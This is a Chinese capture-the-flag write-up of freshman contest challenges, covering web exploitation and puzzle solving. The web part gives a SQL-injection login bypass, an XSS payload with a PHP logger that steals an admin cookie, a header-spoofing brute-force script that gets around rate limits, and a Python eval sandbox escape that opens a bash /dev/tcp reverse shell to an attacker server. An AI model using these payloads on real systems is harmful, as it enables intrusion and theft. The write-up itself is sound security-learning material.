[TOC]

# r00t新生赛

小知识：

1. `192.168.xx.xx` 都是内网地址，`127.x.x.x` 都是本机地址，不走网

## web

### web签到

过一遍web解题的基本思路引导，然后直接F12翻源码找flag即可。

### EatPudding

可爱的音游（居然可以用键盘打，dfjk），既然是前端游戏，那flag八成是在源码里呗，F12找到'源代码'，找到'index.js'文件，在 `shareText()` 函数中发现flag的提示：

```js
function shareText(cps) {
        if (mode === MODE_NORMAL) {
            let date2 = new Date();
            deviationTime = (date2.getTime() - _date1.getTime())
            if (!legalDeviationTime()) {
                return '倒计时多了' + ((deviationTime / 1000) - 20).toFixed(2) + "s";
            }
            SubmitResults();
        }

        if (cps <= 5) return '试着好好练一下？';
        if (cps <= 8) return '再加把劲吧！';
        if (cps <= 10) return '也许可以再努力一些:D';
        if (cps <= 15) return '还差一点点';
        if (cps <= 20) return 'cps大于20就给flag！'
        let a;
        let Re = new XMLHttpRequest();
        Re.open('get', './flag.php?name='+(a?.o||((+ +'a'+'o')??!!a?.a)).toLocaleLowerCase(),false);
        Re.setRequestHeader("Content-type", "application/json");
        Re.send();
        return Re.responseText;

    }
```

大致意思就是cps大于20就能得到flag（那显然不是人类的手速），观察一下，它访问子文件'./flag.php'并用'get'方法请求 `name=` 加上一串字串即可得到flag。所以重点在于请求的内容字串是什么 `(a?.o||((+ +'a'+'o')??!!a?.a))` ，直接将它丢到控制台中运行一下就会得到字串的内容（先声明一下a）：`nano` 。解释一下它是怎么来的，首先字串左侧的可选链 `a?.o` 因为不存在o这个键，所以是'undefined'，所以完全取决于右侧，`??` 是空值合并操作符，只有当它的左侧为'null'或者'undefined'时才会返回右边的值，`!!` 就是取反两次，也就是自己，不过会强制转化为布尔类型，而左侧是 `(+ +'a'+'o')` ，其中左边部分 `+ +'a'` 的值是NaN（加号间的空格不能少，不然就报错了），也就是不认识的变量，说白了就是这个语法编译不出来，而NaN会被当做字符串与'o'相加，所以得到'NaNo'，转化为小写后就是'nano'。

### ezSQL & 免费的留言板

过滤了单引号，使用双引号构造万能密码即可：

```
admin
1“ or "1"="1
```

这里后台使用的是sqlite，注释符号只能用 `--` ，而Mysql的注释符才有 `#` 。然后是老问题，这里用户名也可以直接注入，但是得用两个or，这是因为后面有个 `and password={password}` ，如果只有一个 `or 1=1` ，会出现先判定前后的 `and` 导致 `or` 两边都为false的情况。

然后就是留言板，两题是并在一起的（大型连续剧doge），这里打的是一个XSS（跨站脚本攻击），首先尝试各种标签，由于这个界面本身就是由JS渲染的， `<script>` 标签是不会再次执行的（理由似乎不明？），因此选用 `<button>` 标签的"onclick"触发JS代码，发现可行，就去搜索如何利用留言板打XSS，首先明确cookie一般是带有用户的登录信息的（当前），而在JS环境中读取cookie需要调用 `document.cookies` 参数，因此思路就是将上当触发XSS的管理员的cookie信息利用JS代码发送到自己的服务器上。可以利用JS中的 `document.location=url` 来实现网页的跳转访问，通过访问自己的网站并用get方法请求cookie达到获取cookie的目的。php源码如下：

```php
<?php

if(isset($_GET['cookie']))                 //如果接收到cookie
{
    $file = fopen('./cookie.txt', 'a');    //打开存储的文件
    fwrite($file, $_GET['cookie']."\r\n"); //将获取的cookie存储
    fclose($file);                         //关闭文件
}
```

构造如下payload：`<button onclick='document.location="url/cookie.php?cookie="+document.cookies;'>Click Me!</button>` ，也可以利用图片的 `onerror` 参数实现JS代码的执行，该参数执行内容代码当src加载不对或者干脆为空的时候。有了思路，下一件事就是搭一个服务器，在腾讯云上新建一个应用容器，选择宝塔面板，重装好后在应用管理界面找到面板登录网址，先在防火墙中打开相应端口，一般是TCP协议8888端口；再通过端口进入宝塔面板管理（这里用的是服务器中记录的用户密码），在网站一栏添加站点，FTP与数据库都选择创建，域名如果没有自己购买有效域名，则填写IP地址，否则是无效域名，访问不了。成功后进入根目录将之前的cookie脚本添加进去即可。再提一下XSS的应用领域，任何输入框都是有可能的，尤其是会被加载出来的部分。本题中用户名无法打XSS，它会直接显示，但是举报栏可以，举报中有其他栏目，会给一个输入框，通过输入框打XSS，则管理员会在处理举报时触发XSS并发送cookie（虽然 `ducument.location` 的跳转会让XSS很明显就是了），于是就得到了管理员的cookie，登录后得到flag。结果如下：

```
username=pyy; password="1eDydsQz7LJ_TIj_78aBcVC!aOw1$3@"; PHPSESSID=88ah7gn4u96d2guht6ooouvvj2
```

顺带提一句，由于该网站是JS渲染的，XSS的跳转会导致网站死循环，也就是一进入就跳转，因此后台要想解决问题只能用接口处理所有举报和问题留言。

**参考：[**

[第二范式-Linux命令超大全](https://blog.csdn.net/weixin_44191814/article/details/120091363)

[图文详解如何配置宝塔面板以及搭建网站](https://www.php.cn/topic/bt/476260.html)

[EnX07-XSS抓取Cookie-渗透测试](https://zhuanlan.zhihu.com/p/265221405)

[红云谈安全-利用XSS获取用户cookie](https://blog.csdn.net/qq_51524329/article/details/121583797)

**]**

### EZF12

F12快捷键和右键都被ban了，flag应该在源码里，我当时开发者工具是悬浮的，手动从更多工具中打开后不会发生跳转，就直接找到了flag；后来测试的时候发现如果窗口靠侧边，就会发生页面跳转，跳转到战队的主页（明示多学点知识？）；可以试着用burp发个包，就能得到相应的网页内容（curl不会返回页面源码，但是可以下载页面内容，下下来以后直接改成txt查看就能看到源码）

### Where is flag?

提示目录扫描，可是真用dirsearch扫会发现404报的很少，用burp发包后发现大部分是429，也就是请求过于频繁，但不代表页面不存在，F12可以看到提示，估计一个IP在一段时间内只能访问一定次数，多了就会回显429，因此思路就是想办法仿造IP，爆破目录，根据返回的状态码确定目标网页是否存在。

一开始想拿burp脚本跑，但是因为考虑的是代理思路，觉得太麻烦，就改用python写了。

* 给Burp加载python脚本时出现报错"SyntaxError: Non-ASCII character in file"，给脚本前加上 `#coding:utf-8` 即可解决，因为Burp用的是py2，需要额外的说明utf-8编码才能加载其中的中文注释。

#### Python Requests

最开始的思路是切换代理，以此来改变IP，但是很快就发现这不现实，因为合法稳定的IP池子很烧钱，免费的基本没有用，所以这条路行不通。事实上简单的伪造IP只需要改变消息头，手动构造一个http头：`X-Forwarded-For:xxx` ，并在每次发包时修改它就可以保证自己的IP是变换的，由于这题没做合法校验，这个IP头的内容是什么都行（趁机暴打出题人），只要不同就能避免429重复，利用python的Request模块写一个脚本发包校验字典即可： 

```python
import requests

proxy='pyy has no hair!';
url_='http://81.69.243.226:30001/';
headers={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'X-Forwarded-For':'',
    }
c=0;
res=[]
with open('./dicc.txt') as file:
    s=file.readline()
    while s != "":    
        if s[-1]=='\n':
            s=s[0:-1];
        proxy=proxy+'!';
        headers['X-Forwarded-For']=proxy;
        url=url_+s;
        res.append(requests.get(url=url,headers=headers))
        if res[c].status_code == 200:
            print(s);
        c+=1;
        print(str(c)+":",end=" ")
        print(res[c-1].status_code,end="\n")
        s=file.readline()

```

不是异步效率也不是很高，差不多一秒五次左右，比直接用扫描器定时发送快上不少是真的，但是有些小问题，例如在访问成功，出现200状态码后就容易出现一个429，BUG原理不明。差不多跑了一个小时才跑完整个字典，将输出复制粘贴到VSC中，选中404修改所有匹配项，直接删除，然后找还剩下的状态码就行了，最后留下几次出错和几个存在的目录：

```
Admin
1637: 200
1639: 429
docs
4987: 200
4989: 429
wp
9128: 200
9216: 429
```

不知道是不是网站出了问题，后台没有访问进程的情况下直接访问目录也会报告429，被迫只能用burp发包修改IP头，最后再wp目录下找到flag。

curl命令也可以伪造HTTP头：

```bash
curl url -H 'X-Forwarded-For:IP'
```

`-H` 构造HTTP头

为了让脚本效率更高，可能需要异步或者多线程来优化，但是可惜的是requests库是同步阻塞的，因此无法利用asyncio实现异步调用。

Python中的异步指的是程序地协程运行，与Js正好相反，Python中的await会将async函数的执行权转交出去实现异步，而Js因为默认就是异步执行，await会固定函数执行权达到同步的目的。但两者的异步模型是差不多的，都是一个生产者-消费者的模型，await与async的应用也大差不差。

这里使用自带线程池的"HackRequests"包来优化脚本：

```python
import HackRequests as hack
import copy

proxy=0;
url_='http://81.69.243.226:30001/';

headers={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'X-Forwarded-For':'',
    }
c=0;

#定义回调函数
def _callback(r:hack.response):
    print(r.status_code,end="\n");
    if r.status_code!=404:
        print(r.log.get('request'));

#建立线程池
threadPool= hack.threadpool(40,_callback);

with open('./dicc.txt') as file:
    s=file.readline()
    while s!="":    
        if s[-1]=='\n':
            s=s[0:-1];
        proxy=proxy+1;
        headers['X-Forwarded-For']=str(proxy);
        url=url_+s;
        #将请求装入线程池,给headers对象做拷贝
        threadPool.http(url=url,headers=copy.copy(headers));
        c+=1;
        s=file.readline()

threadPool.run()
```

可在 `threadpool` 中的第一个参数自定义线程个数来控制速度，效率远高于同步的requests库，40个线程完成扫描只需要几分钟。但这里需要注意的地方是headers，如果传入字符串则需要HTTP头格式：

```python
headers=```'User-Agent: xxx
X-Forwarded-For: 0'''
```

不同头需要换行分隔，冒号后面一定要跟空格，否则线程在调用过程中会持续报错，表示无法读入HTTP头。而如果使用的是对象，则一定要做拷贝，这涉及到对象的特点：内部存储键值时，值是依赖地址索引的。就像C++的指针一样，传入对象时实际传入的是对象内存储的地址，调用时再从地址中取值，而线程池是批量统一运行的，哪怕你传进去的时候IP头的值为'1'，但由于是地址索引，在运行时那个地址只有一个值，所以所有IP头的值都会是相等的，这就会导致429状态码的出现。由于只有一层，只需要做浅拷贝即可。



**参考:[**

[hack-requests](http://www.voidcc.com/project/hack-requests)

[阮一峰-Python异步编程](https://ruanyifeng.com/blog/2019/11/python-asyncio.html)

[Syangy-伪造IP](https://blog.csdn.net/Mr_Shiyang/article/details/105530969)

[runoob-HTTP X-Forwarded-For头](https://www.runoob.com/w3cnote/http-x-forwarded-for.html)

[Python爬虫——伪装代理（IP和User-Agent）](https://blog.csdn.net/qq_43652321/article/details/107606571)

[Python中Requests库使用方法详解](https://zhuanlan.zhihu.com/p/137649301)

[python3标准库：copy复制对象](https://www.cnblogs.com/liuhui0308/p/12346847.html)

**]**

### I'm not a robot

验证码题，之前比赛其实出现过，但是因为看不懂就摸鱼了，现在又出来了，不得已暴露自己比赛摸鱼的事实。其实五百道四则运算题用不了多久，折腾两个小时说不定就搞定了（如果黑心出题人真的肯给flag），除此之外可以试试JWT与图像识别，图像识别用python的库好像出不来，也许要依靠字符匹配？我通过攻击eval拿到了flag

#### Python沙箱逃逸

输入框允许输入'/'，而输入'+'与'*'会报过滤，但其实'-'也是可以的，直接输入一个裸的减号会出现报错，裸除号也会，上网查阅一下资料：[SyntaxError:unexpected EOF while parsing](https://blog.csdn.net/qq_44214671/article/details/107754513) 

可以得到两个信息，减号也可以直接输入让后台做运算，和除号一样；后台大概率使用了 `eval()` 函数，如果输入的是非法的python表达式就会回显错误，而且是语法错误（可以试试输入字母），这也是后台处理除号和减号运算的原理。既然使用了 `eval()` 函数并给了我们输入代码的能力，那我们就可以考虑通过攻击这个 `eval()` 达到任意代码执行（RCE）的目的。

然而python的沙箱逃逸需要大量的前置知识做铺垫。

先用几串payload试探一下情况：

`dir(__builtins__)`，可以看到内置命名空间的可控情况：

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539188.png)

`eval exec import system open`，可以看到几个重要函数的过滤

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539193.png)

`"".__class__.__mro__`，会发现类不做显示，对参数查找造成一定阻力：

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539198.png)

`dir()`，查看当前环境下的变量与导入模块：

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539204.png)

`__builtins__`，字典化内置命名空间的属性：

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539214.png)

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539216.png)

`[].__class__.__bases__[0].__subclasses__()`：

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539219.png)

`picDir`：

因为import惨遭过滤，各种绕过都实现不了，所以只能利用python的奇妙继承关系与魔术方法获得一个万能基类 *object* 来得到一些敏感函数，比如 `subprocess.Popen`

先在自己的电脑上测试，`<class 'object'>` 中没有 `<class 'os.system'>` 类，但是有 `<class 'subprocess.Popen'>` ；利用调用链 `[].__class__.__bases__[0]` 可得到 *object* ，但是回显中是不会显示 `<class 'type'>` 这类值的，所以只能用 `[].__class__.__bases__[0].__subclasses__()[-1].__name__` 逐个尝试它的名字...那当然不行，鬼知道里面有几个类，利用**列表生成式**构造如下表达式去显示 `__name__` 属性：

```python
b=[x.__name__ for x in ''.__class__.__mro__[1].__subclasses__()];
```

然后以超快的手速CACV将列表复制下来，搜索 `Popen` ，发现确实存在后丢到python中，用

```python
c=list[...]
print(c.index('Popen'))
```

得到下标为227，于是我们就得到 `subprocess.Popen()` 函数了，`[].__class__.__bases__[0].__subclasses__()[227]` 。构造payload：

```python
[].__class__.__bases__[0].__subclasses__()[227](['/bin/bash','-c','bash -i >& /dev/tcp/IP/23333 <&1'])
```

接下来弹个shell到自己服务器上就大功告成了。

* `__class__` 返回一个对象的类，也就是实例的模板，python里一切皆对象；

* `dir()` 直接显示当前环境的变量、方法和定义的类型列表、模块；`dir(obj)` 带参数时返回对象的所有方法、属性列表，如果参数包含方法 `__dir__()` 则调用该方法
* `__mro__` 返回类的所有父类以及继承顺序，'object' 在最右侧；`__bases__` 显示所有父类，'object' 在最左侧；
* `__dict__` 以字典形式存储类中的属性（包括方法），可以从 `dir()` 中获取相应属性字符串，再用 `__dict__['name']` 调用
* `__subclasses__()` 表示引用的所有子类
* 在'python3'中可以通过 `"".__class__.__mro__[1]` 来获取'object'对象
* 在'python3'中所有的类默认继承自 Object 类，继承 object 的全部方法。'python2'中类默认为 "classobj" ，只有 `['__doc__', '__module__']` 两个方法
* python3 最大（内置）名称空间："builtins" 和 `__builtins__` ，后者不需要导入
* 当返回内容为 `<class 'type'>` 时，不知道如何用值去匹配，所以列表难以索引，只能逐个用 `__name__` 属性去匹配，如 `<class 'subprocess.Popen'>.__name__` 的值为"Popen"；

**参考:[**

[SSTI/沙盒逃逸详细总结](https://www.anquanke.com/post/id/188172)

[各种姿势解析-Python沙箱逃逸](https://blog.csdn.net/qq_43390703/article/details/106231154)

[一文看懂Python沙箱逃逸](https://www.freebuf.com/articles/system/203208.html)

[Python绕过](https://blog.csdn.net/weixin_39795292/article/details/110773931)

[Python沙箱逃逸总结](https://xz.aliyun.com/t/9178)

[h0cksr-Python沙箱逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html)

[Ncat与Netcat](https://www.zhihu.com/question/414045334/answer/1625710674)

[subprocess.Popen](https://www.cnblogs.com/ddzc/p/12382534.html)

[Python连接字符串](https://blog.csdn.net/weixin_39628945/article/details/110269774)

[Python eval()函数](https://www.runoob.com/python/python-func-eval.html)

**]**

##### 反弹shell

因为之前重装了服务器，用命令 `yum -y install nc` 安装一下nc，然后先挂起nc的监听：

```
nc -lvp port
```

`-l` 表示监听，`-v` 输出nc的相关信息，`-p` 表示指定端口，`-n` 表示直接使用IP地址，而不通过域名服务器；然后在本地开wsl尝试发送ls数据：`ls > /dev/tcp/IP/233` ，结果没有成功，本地能ping通服务器，但是用 `telnet IP port` 测试会发现无法建立连接，腾讯云的防火墙已经开了，但是尝试反弹shell会出现报错：["没有找到主机的路由 (Host unreachable)"](https://blog.csdn.net/Zxiaobinggan/article/details/109093480)，用 `systemctl status firewalld` 检查防火墙会发现处于开启状态(用 `sudo fire-cmd --state` 也行)，先用 `service firewalld stop` 关闭服务，重新监听端口后再尝试弹shell，这一次成功得到目录。

一般的反弹shell语句为：`bash -i >& /dev/tcp/IP/port 0>&1` 表示创建一个交互shell，并将输入输出都转移到目标服务器上，也可以不使用 `bash -i` ，而是将具体命令行的结果发送过去 `ls > /dev/tcp/IP/port`。

顺便提一嘴，Ncat和Netcat其实是两个东西，后者已经不再更新，且功能上基本被前者完全替代，电脑上装有Ncat的情况下nc命令默认使用Ncat

接下来尝试反弹shell，先尝试payload：

```bash
[].__class__.__bases__[0].__subclasses__()[227]('ls >& /dev/tcp/IP/23333',shell=true)
```

但是目标主机没反应，换一个payload：

```bash
[].__class__.__bases__[0].__subclasses__()[227](['/bin/bash','-c','ls >& /dev/tcp/IP/23333'])
```

发现成功了，这是因为 `shell=true` 相当于在命令前面加上 `/bin/sh -c` 表示用sh来执行命令，很不巧的是sh不支持 `/dev/tcp` ，这是bash专属的；而如果不带shell参数，则要传入一个命令列表，其中第一项需要是一个可访问的文件，调用bash执行命令即可，参考：[python-subprocess.Popen的使用](https://www.jianshu.com/p/9d4e4cf06d23) 

其次这里也无法使用 `chsh -s /bin/bash` 来切换shell，一方面是默认shell就不一定是sh，另一方面是该命令需要sudo，而不需要sudo的 `chsh` 是交互。`bash -c` 可以用bash执行接下来的命令

最后用grep命令找出flag即可...也不即可，黑心出题人的flag虽然确实在当前文件夹下，但是改了个前缀变成了 "r0v0t"，还好同一个文件夹下有好几个r00t{}格式的flag，翻一翻就能看到那可爱的"r0v0t"

最后要看懂沙箱逃逸所需要的时间是老实算验证码的不知道多少倍，我的评价是不如直接算验证码，珍惜头发

**参考:[**

[走在路上的小白鼠-常见的反弹shell方法及解释](https://blog.csdn.net/qq_45584159/article/details/111489653?utm_source=app&app_version=5.3.1&utm_source=app)

**]**



## Misc

### 签到

flag字体颜色与背景一致，高光选中（Ctrl+A）或者直接翻源码都能找到。这题我也看了好久来着= =

### strange LSB -> strange ? Significant Bit

暴打pyy的题目，如果这题划成分，那我觉得成分里全是氵，只有一滴是LSB，那一滴还是骗人的。。。首先拿到题目，说是LSB，那就丢进steg里找找，找到了小半个flag...

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539239.bmp)
然后呢，然后啥都没有，把各个位数上的图片拿出来叠加也没有结果，于是就想给出的flag可能提示了图片的出处，付费（-36）的提示说是社工，好，那一定是上网搜图找地儿了吧，于是就搜啊搜，看着一个"Ma"找马达加斯加、找玛格丽特河，试一试名字行不行，毕竟flag不能直接给那就只能是这些现成的单词，结果一个都不对...然后新提示来了，看看出题人的qq，行，瞅一眼，哇哦，居然有这张图，感情是自己整的，那难道是qq信息里有什么地名提示？搜罗一番还是莫得（沉迷地名无法自拔），再看群里，出题人说要用到手机。。。我就上手机一看，发现电脑上拿不下来的背景图手机上拿的下来，我想直接找LSB隐写就行了吧，然后什么都没有。。。于是就把下载下来的和空间找到的两张图叠图异或，然后找到了flag。然后提（pan）询（wen）出题人思路是什么，出题人表示：图像处理有点小难，所以加了个困难标签，合情合理。最后拿到了图像处理的源码，一份是"insertFlag.py"：

```python
import cv2
from itertools import product
import numpy as np

lsb=1

if __name__ == '__main__':
  #读取图像
  flagImg=cv2.imread("flag.png",0)#黑白
  sourceImg=cv2.imread("qq.jpg",1)#彩色
  
  #使生成的flag在图像的中间
  startPoint=[(sourceImg.shape[0]-flagImg.shape[0])//2,(sourceImg.shape[1]-flagImg.shape[1])//2]
  print(flagImg.shape, sourceImg.shape, startPoint)
  for y,x in product(range(flagImg.shape[0]),range(flagImg.shape[1])):
    #如果flag图像上这个像素是黑色的, 那就把原图的这个点的所有像素值-1
    
    if flagImg[y,x]<255:
      if x<200:
        sourceImg[y+startPoint[0],x+startPoint[1]]=sourceImg[y+startPoint[0],x+startPoint[1]]&(~lsb)
      else:
        sourceImg[y+startPoint[0],x+startPoint[1]]=sourceImg[y+startPoint[0],x+startPoint[1]]^lsb
      
  #写出图像
  cv2.imwrite("out.png",sourceImg)

```

和"getFlag.py"：

```python
import cv2
import numpy as np
from itertools import product
from insertFlag import lsb

if __name__ == '__main__':
  flagImg=cv2.imread("out.png",1)
  sourceImg=cv2.imread("qq.jpg",1)
  for y,x in product(range(flagImg.shape[0]),range(flagImg.shape[1])):
    if (flagImg[y,x]-sourceImg[y,x]<lsb).all():
      flagImg[y,x]=np.full((3),255,np.uint8)
    else:
      flagImg[y,x]=np.full((3),0,np.uint8)
  cv2.imwrite("ans.png",flagImg)
```

这里用到了一个"insertFlag"的python组件，然鹅我看的也不是很懂。总之利用"stegSolve"的叠图运算可以解决，甚至比处理出来的还清楚（?）

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539244.bmp)

**参考：[**

[Lsb图片隐写](https://blog.csdn.net/weixin_34075268/article/details/88744599)

**]**

### 骗！偷袭！绑架勒索！【任务B：情报收集】

一道很有趣的题，下下来一个.mht文件，是一封邮件，它会提示你用IE打开，但实际上它可以以文本格式打开，里面有最全面的信息，包括邮件的格式，虽然发件人仍然被隐藏了，但是会找到一串用Base64加密过的信息：

```
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gV2FubmFFc2NhcGUg
djEuMDAgYnkgWkhBTkdTQU4sIDIwMjItMDMtMzEgLS0+DQo8V2FubmFFc2NhcGU+DQoJPGVtYWls
PmV6Zm9yZXZlckByMDB0ZWFtLmNjPC9lbWFpbD4NCgk8aW5mZWN0ZWQ+MjAyMi0wNC0wMVQwNjoy
NToyMi4wMDBaPC9pbmZlY3RlZD4NCjwvV2FubmFFc2NhcGU+
```

解密后的内容是：

```
<?xml version="1.0" encoding="utf-8"?>
<!-- WannaEscape v1.00 by ZHANGSAN, 2022-03-31 -->
<WannaEscape>
	<email>ezforever@r00team.cc</email>
	<infected>2022-04-01T06:25:22.000Z</infected>
</WannaEscape>
```

我第一次还没看到，后来又绕回了这里才发现有一个"by ZHANGSAN"，注意这题直接交人名作为答案即可，不需要包上flag格式。起初我是以为这题要得到文件本体或者真的发送邮件到某个地址，从回信中得到人名的，结果发现里面的所有邮件信息，除了Ezforever的，都是伪造的。

```
spaces
```

```
=_NextPart_SMP_1d844a4b687fc8d_52122bf1_00000001
```

```
1100 0010 1010 0000
C2 A0
64+2+1 67 C
5
```

### FlaggyBird

菜就多练练，游戏题怎么可以不打游戏呢

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539266.png)

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539299.png)

或者也可以不打游戏，试着用 [pyinstall](http://c.biancheng.net/view/2690.html) 处理这个python小游戏，可以借助010editor浏览游戏文件的文件内容，判断文件类型

下载一个["pyinstxtractor-master"](https://github.com/extremecoders-re/pyinstxtractor)，将这个用python写的小游戏解压，然后如果用windows系统，就装一个["grep for windows"](https://blog.csdn.net/mainmaster/article/details/122995603)，在命令行输入 `grep r00t -r  flaggybird.exe_extracted ` ，搜索文件夹中存在关键字的地方，然后再在响应文件夹下输入 `strings flyppybird.pyc | grep -a r00t` ，`|` 表示管道，左边是输入，右边是根据左边的输入得到相应输出，`strings` 将二进制文件转化为文本，`-a` 强行显示文本内容，最后得到flag。如果命令出错：`strings flyppybird.pyc | grep -a r00t flyppybird.pyc` 导致有文件挤占管道的输入会出现报错：`no space left on device` 

### 所以这红桩子到底是什么！？

提起舟山，我一个学过地理的浙江人第一反应居然是杭州...地点在浙江省宁波舟山市，flag是地点名，关键信息是学校旁边有条河，河对面有个码头，看图这条河挺宽，右边还有很多小岛，所以flag格式才会那么丰富，有岛湖礁。打开手机版的腾讯地图搜索舟山市码头，找找看在内河旁边的码头有几个，三江客运中心是，但河对面没有学校，而且这条河是内河，地图上没看到有岛礁，外侧那条宽的不知道称不称的上是河的水路对面是一座小岛，也找不到学校的影子；看完这个我就想到这条宽阔有岛礁的河可能不是内河，在主岛上浏览一遍水路的周侧，基本都很窄，而且对面没有学校，看起来也不像是有岛礁的样子，所以可以考虑这条所谓的河是环岛外侧的河，而不是岛内的河。再搜索"舟山市码头 学校"，跳出来的是墩头码头，很可惜对面没有学校；既然学校这么难找，那就直接搜索"舟山市学校"，其中位于岛外侧且对面或附近有岛礁的有沈家门中学、浙江大学一片与浙江海洋大学长峙校区，我直接就看浙江大学去了，为了比对风景先切换到卫星地图，校区离这条河不远，往对岸看的话右侧确实有一片岛礁，放大以后细看会看到一个吐出来的红色区域，可能是集装箱，所以应该有码头，但是地图上一开始不显示，拉到最大才会看见一个"王家墩码头"，基本符合的情况下找找红桩子，刚好从图中的视角来看集装箱的左后方有一块很模糊的深色陆地，所以很可能是，但是卫星地图下没有任何地名，切换回标准地图后会发现这块地方是"玉秃礁"，试了试发现就对了，所以就是这里。

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539318.png)

做完以后再来分析一下这题的提示，这条朋友圈的语气像是新生入学，所以大学的可能性很大；另一方面"王家墩码头"搜索"舟山市码头"是不会显示的，但是直接搜索"码头"它会显示一个小红点，这应该是关键词的问题。最后如果可以试着搜索一下关键字"舟山市码头 学校"，它会导向"舟山壹号码头餐厅"，放大后会找到"王家墩码头"，对面有小学和大学，刚好是符合条件的，但我一开始没明白这个关键词为什么会导到这里，后来想想可能是因为大学生经常出入这一块，所以关联性比较强。

### 骗！偷袭！绑架勒索！

文件提示里只有一个特殊字符：`C2 A0` ，是"non-breaking space"，能保证不被压缩长度（很多空白字符连续在某些环境会被压缩）并保证两侧的文字处在同一行，常用于排版，会写成 `&nbsp` ；恰巧题目又提示我们回去看那封勒索信，在下方的段落中看到 `<i>` 标记的几个字母拼接出的英文："spaces"。显然是要我们注意 `&nbsp` 。打开010editor一看，确实有很多C2A0，但是一时看不出什么规律，拖进VSC会发现VSC自动将这些非常规空格标记了出来。接下来的问题在于加密的方法到底是什么，考虑到flag是一串英文，我第一想法是藏头或者组合字母拼接英文，但很可惜这个思路怎么也行不通，后来想到 `&nbsp` 的作用，又试着将这些不换行的地方强行换行了一下，但也没找到什么东西。结果这居然是摩尔斯电码

为什么这也能整成摩尔斯电码...确实有点抽象，特殊空格为长，正常空格为短，一行取一个字母。用摩尔斯电码来解读确实很好的解释了为什么这封邮件有这么奇怪的换行排版，以及密文为什么非得分到三块内容中去写，而不是简单的集成在某一部分

```
Your-important files-are 		-.-  k
encrypted.-Many-of-your			---  o
documents, photos,-videos		.-   a
and other-files are no			.-.. l
longer accessible because		..   i
they-have-been					--   m
encrypted. You-can				.-   a
verify-this by trying			-..  d
to open							.	 e
them.-Maybe-you					--	 m
are looking						.	 e
for-a way to					-..  d
recover-your-files,-but			---  o
do-not							-	 t
waste your time. Nobody can		.... h
recover your files				..	 i
without our decryption service.	...	 s

We guarantee that				..	 i
you can recover all-your		...- v
files safely					.	 e
and-easily. But you need		-... b
to pay,							.	 e
and you							.	 e
only-have 3						-.   n
days to-submit					.-   a
the-payment. After that the		-... b
price-will be doubled.			-..	 d
Also, if you-don't				..-  u
pay-in 7-days, you 				-.-. c
won't-be						-	 t
able to							.	 e
recover-your files forever.		-..	 d

Payment is accepted in			...  s
Dogecoin only.					.	 e
Please-check the				-.	 n
current-price and buy			-..	 d
some Dogecoins, then send the	.... h
correct amount					.	 e
to the-address specified below	.-.. l
Contact us-for-more information .--. p

koali made me do this i ve been abducted(劫持) send help
```

说人话就是koali绑架了我，我被劫持了，发出求救信号（koali风评被害）

说实话就是我真没想到摩尔斯电码能这样解，一开始我看着空格的位置也考虑了一下摩尔斯电码，但没想明白长短如何分配，而且前面的 `spaces` 的提示是单词拆出字母组合而成的，所以我一直觉得是由 `&nbsp` 附近的单词组合字母得到flag，毕竟这个特殊字符最大的意义就是控制不换行，那不换行总该是一个提示吧，结果真不是...

### 第八号当铺

众所周知，misc人称小密码学，下载文件的名称就提示了这是个jpg文件，或者查看二进制数据也可以通过文件头确认是jpg文件，修改后缀打开图片，是一串由工田balabala。

网上搜由工田，会发现这题是[当铺密码](https://www.cnblogs.com/Clair-is-com/p/16191740.html)，出头几划就是数字几：

```
114 48 48 116 123 100 111 110 116 95 112 97 119 110 95 121 111 117 114 95 108 105 102 101 125 
```

将数字转换成相应字母即可得到flag：

```python
s=input()
num=0
ss=""
for x in s:
    if x==" ":
        num=int(ss)
        ss=""
        print(chr(num),end='')
    else:
        ss=ss+x;
```

### Jigsaw

给了个7z的文件，显然是压缩包，修改后缀后解压打开会发现一堆零散的图片

费电脑还费眼睛的一道拼图题，不用拼完也能得到flag：

```
r00t{NieR_Aut0_mata_2B}
```

其中0和o区分一下就好。

但我还是试着给它拼完了：

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539285.png)

除了人物主体比较分明，后面的背景真是一眼难尽，本来就高度相近的色调与飘忽的线条，突出一个抽象，不过这背景的真的很美，拼图分开的时候觉得各种割裂，拼在一起以后又觉得意外的和谐，很多地方不放上去比较一下都发现不了可以接在一起，局部色彩相近但整体效果却相当好，各部分拼图的接口处往往都是色彩的分界线，这么小的色彩尺度还能有这么漂亮的效果，只能说画师太牛了。

### CAESAR

*I came，I saw，I conquered*

下载下来一个压缩包，如果用7z解压会直接解压出文件，但是会提示文件头错误；如果用别的压缩软件解压会提示输入密码，直接打开压缩包会发现里面的内容没上锁，显然是一个伪加密，进入010editor，会发现里边包了四层PK（zip文件头），好吧真牛，从 `50 4B` 开始的八个字节都是固定格式的，可以标记为zip的文件格式特点，接下来两个字节是**全局方式位标记**，`00 00` 表示未加密，可以看到第三层PK的标记是 `09 00` ，修改后可直接解压。（文件修复后伪加密没了）

